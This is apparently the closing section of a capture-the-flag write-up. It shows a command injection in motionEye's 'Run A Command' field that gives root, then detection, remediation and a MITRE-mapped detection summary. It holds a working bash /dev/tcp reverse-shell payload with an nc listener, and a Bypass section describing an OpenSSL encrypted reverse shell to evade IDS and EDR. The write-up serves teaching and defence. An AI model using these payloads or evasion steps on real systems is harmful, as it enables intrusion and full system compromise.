The motionEye File Storage configuration panel includes a "Run A Command" field that specifies a shell command to execute after a file is saved. The value of this field is passed directly to the system shell without sanitisation, making it a textbook OS command injection point. An attacker with administrative access to the motionEye panel: achieved in the previous step: can replace the intended filename format string with an arbitrary shell payload. When a capture is triggered, motionEye executes the field contents as a shell command. The service runs as `root` on this host: a critical misconfiguration that transforms what would otherwise be an application-level code execution issue into immediate full system compromise. The payload uses `python3` to invoke `os.system()` with a bash TCP reverse shell, creating an outbound connection from the server to the attacker's listener and delivering an interactive root shell.

```
nc -lvnp 4444
```

Payload entered in Settings → File Storage → Run A Command:

```
$(python3 -c "import os; os.system('bash -c \"bash -i >& /dev/tcp/10.10.16.244/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```

```
uid=0(root) gid=0(root) groups=0(root)
```

**Logs Generated:**
1. motionEye logs the executed command in its application log: typically at `/var/log/motioneye/motioneye.log` or accessible via `journalctl -u motioneye`. The injected payload string including the reverse shell command appears in this log.
2. `/var/log/syslog` may record the outbound connection initiation depending on syslog configuration.
3. `/var/log/auth.log` does not capture this event: it is not a PAM or SSH event.

**Alerts Triggered:**
1. An outbound TCP connection from the `motion` process to an external IP on port 4444 is a high-confidence reverse shell indicator. Host-based firewall rules blocking outbound connections from server processes to non-standard ports would prevent shell delivery.
2. An egress filtering rule blocking all outbound traffic except ports 80, 443, and 22 would drop the reverse shell connection before it reaches the attacker's listener: the most effective single control at this stage.
3. Snort/Suricata rules detect `bash -i` and `/dev/tcp/` patterns in TCP payloads. The reverse shell traffic is cleartext: payload-level IDS detection is viable.

**Network Artifacts:**
1. Outbound TCP SYN from `10.129.7.239` to `10.10.16.244:4444`: server-initiated outbound connection to a non-standard port is anomalous for any web application process.
2. The directionality (server connecting to client) is the primary network-level indicator: servers do not typically initiate outbound TCP connections to client IPs.
3. Reverse shell session content transmitted as cleartext TCP: bash prompts, executed commands, and command output are fully visible in PCAP to any network observer.
4. The `bash -i >& /dev/tcp/` pattern is a well-documented and widely-signatured reverse shell technique.

**Artifacts Left:**
1. The injected payload persists in the motionEye configuration file or database: it does not clear automatically after execution and remains forensically recoverable.
2. motionEye application log retains the executed command string.
3. No file written to disk on the target from the reverse shell itself: subsequent commands within the shell session create their own artifacts.

**Sysmon / EDR:**
1. Linux EDR generates a critical alert on the process tree: `motion -> python3 -> bash` with an outbound network socket: this is a textbook post-exploitation process chain.
2. The `bash` process owning a TCP socket connected to an external IP is a standalone high-severity indicator in all major EDR products (CrowdStrike Falcon, SentinelOne, Wazuh).
3. Process arguments visible to EDR: `bash -c "bash -i >& /dev/tcp/10.10.16.244/4444 0>&1"`: the `/dev/tcp/` redirect is a known shell escape technique logged in full by auditd `execve` monitoring.

**SIEM Correlation:**
```
index=network sourcetype=firewall_logs direction=outbound dest_port=4444
| stats count by src_ip, dest_ip, dest_port
```
```
index=os sourcetype=linux_audit type=SYSCALL comm=bash
| where like(proctitle, "%/dev/tcp%")
| stats count by pid, ppid, uid
```

**Sigma Rule:**
1. [proc_creation_lnx_reverse_shell.yml](https://github.com/SigmaHQ/sigma/search?q=reverse+shell+linux): detects bash spawning with network redirection arguments including `/dev/tcp/` patterns.
2. [lnx_shell_proctree_susp.yml](https://github.com/SigmaHQ/sigma/search?q=suspicious+shell+process+tree): detects anomalous parent-child process chains where a non-shell parent process spawns an interactive shell.

**Bypass:**
1. Encrypt the channel: replace the bash TCP redirect with an OpenSSL reverse shell: `openssl s_client -quiet -connect 10.10.16.244:443 | /bin/bash | openssl s_client -quiet -connect 10.10.16.244:444`: encrypts session content, defeating payload-level IDS signatures. Traffic appears as TLS to a non-standard port: still anomalous but not payload-inspectable.
2. Use port 443 or 80 for the callback: outbound HTTPS from a server to an external IP is less anomalous than port 4444 and bypasses simple port-based egress rules. Requires the attacker's listener to be on that port.
3. Replace the `bash -i >& /dev/tcp/` technique with a compiled Go or C reverse shell binary: removes the recognisable shell argument patterns from process arguments visible to auditd and EDR.
4. None of these bypasses defeat a fully deployed EDR with behavioural analysis: a web application process spawning any external network connection remains anomalous regardless of encryption or port choice.

**Remediation:**
1. The `motion` service must not run as root: create a dedicated low-privilege `motion` service account with no network access rights beyond what the application requires.
2. Implement outbound egress filtering blocking all non-necessary outbound ports and destinations from the server.
3. The "Run A Command" field must sanitise or entirely disallow shell metacharacters: input containing `$()`, backticks, `;`, `|`, `&`, and `>` should be rejected.
4. Restrict access to the motionEye settings panel to authenticated sessions over HTTPS from internal networks only.

**OpSec Rating:** Loud: outbound reverse shell from a server process to a non-standard port is one of the highest-confidence intrusion indicators across network, endpoint, and SIEM monitoring.

---

## Flags

| | |
|---|---|
| User | `cat /home/mark/user.txt` |
| Root | `cat /root/root.txt` |

---

## Detection Map

| Step | MITRE | Log Source | Sigma Rule | OpSec |
|---|---|---|---|---|
| Port scan | T1046 | Network / firewall | proc_creation_lnx_susp_nmap.yml | Loud |
| Web enumeration | T1083 | /var/log/apache2/access.log | web_scan_generic_product.yml | Loud |
| Default credentials | T1078.001 | /var/log/apache2/access.log |: | Silent |
| SQL injection | T1190 | /var/log/apache2/access.log, MySQL | web_attack_sqli.yml | Loud |
| Hash cracking | T1110.002 | Attacker host only | proc_creation_lnx_password_cracker.yml | Silent |
| SSH login | T1021.004 | /var/log/auth.log | lnx_auth_successful_ssh_login_from_new_source.yml | Moderate |
| Network enumeration | T1049 | auditd / EDR | proc_creation_lnx_network_enumeration.yml | Moderate |
| SSH tunneling | T1572 | /var/log/auth.log | lnx_ssh_port_forward.yml | Moderate |
| Credential in file | T1552.001 | auditd / EDR | file_access_lnx_sensitive_files.yml | Silent |
| Command injection | T1059.004 | motionEye log, EDR, network | proc_creation_lnx_reverse_shell.yml | Loud |

---

## Would I Get Caught

**Assumed environment:** Default Ubuntu installation running Apache, MySQL, ZoneMinder, and motionEye. No WAF, no EDR agent, no auditd rules configured beyond defaults, no SIEM ingesting local logs. Standard syslog and Apache access logging only.

**Verdict:** No. The complete attack chain from external reconnaissance to root shell executes without a single alert firing. Every step produces log entries, but nothing is monitoring them in real time. The Apache access log contains the full evidence of the SQL injection: thousands of entries with SQL syntax in the URI, and no one sees it.

**The single control that breaks the entire chain:** Parameterised queries in the ZoneMinder codebase. Fix the SQL injection and `mark`'s bcrypt hash is never exposed. Without the hash, it is never cracked. Without the password, SSH is never reached. Every subsequent step: internal service discovery, port forwarding, config file access, command injection: becomes inaccessible. One developer writing a prepared statement at the database layer eliminates the entire attack path.

**Where a tuned environment catches this operation:**

The sqlmap traffic against port 80 would have been blocked by ModSecurity with OWASP CRS before a single row was returned from the database: the SQL injection yields nothing, the hash is never obtained. If that line is bypassed with tamper scripts, the outbound reverse shell to port 4444 would be dropped by egress filtering and simultaneously trigger an EDR alert on the `motion -> python3 -> bash` process tree with an external network socket. Either control independently terminates the operation at a different stage.

**What remains undetectable regardless of environment:**

Offline hash cracking generates zero target-side visibility by definition. Reading a world-readable configuration file as a legitimate system user produces no alert in any standard configuration. The SSH login from a new IP is logged and is evidence post-incident, but in a default environment it triggers nothing in real time. These steps represent the quiet phases of the operation: the noise is entirely front-loaded in the reconnaissance and exploitation stages.
